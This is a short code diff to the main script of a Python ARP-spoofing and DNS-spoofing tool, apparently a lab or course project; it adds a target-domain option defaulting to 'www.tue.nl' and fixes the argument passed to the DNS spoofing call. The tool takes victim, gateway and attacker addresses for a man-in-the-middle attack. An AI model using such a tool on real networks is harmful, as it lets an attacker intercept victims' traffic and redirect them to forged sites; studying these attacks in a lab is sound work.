@@ -12,6 +12,7 @@ def main():
     parser.add_argument("--victim", required=True, help="IP address of the victim machine")
     parser.add_argument("--gateway", required=True, help="IP address of the gateway")
     parser.add_argument("--attacker", required=True, help="IP address of the attacker machine (for DNS spoofing)")
+    parser.add_argument("--target-domain", default="www.tue.nl", help="Domain to spoof (e.g., tue.nl)")
     args = parser.parse_args()
 
 
@@ -39,7 +40,7 @@ def main():
         arp_thread.start()
 
         # Start DNS Spoofing in the main thread
-        dns.start_dns_spoof(args.targets, args.attacker_ip)
+        dns.start_dns_spoof(args.target_domain, args.attacker)
 
     except KeyboardInterrupt:
         print("\n[+] Stopping ARP Spoofing. Restoring network...")
